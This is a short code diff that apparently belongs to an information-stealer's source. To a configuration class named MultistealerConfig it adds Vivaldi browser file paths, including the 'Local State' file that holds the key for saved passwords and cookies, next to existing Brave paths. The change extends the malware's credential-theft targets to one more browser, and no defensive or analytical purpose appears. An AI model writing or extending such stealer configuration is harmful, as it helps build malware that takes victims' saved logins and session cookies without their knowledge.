@@ -51,6 +51,11 @@ class MultistealerConfig:
         rf"{environ['USERPROFILE']}\AppData\Local\BraveSoftware\Brave-Browser\User Data",
     )
 
+    VivaldiPaths: tuple = (
+        rf"{environ['USERPROFILE']}\AppData\Local\Vivaldi\User Data\Local State",
+        rf"{environ['USERPROFILE']}\AppData\Local\Vivaldi\User Data",
+    )
+
 
 @dataclass
 class SystemConfig:
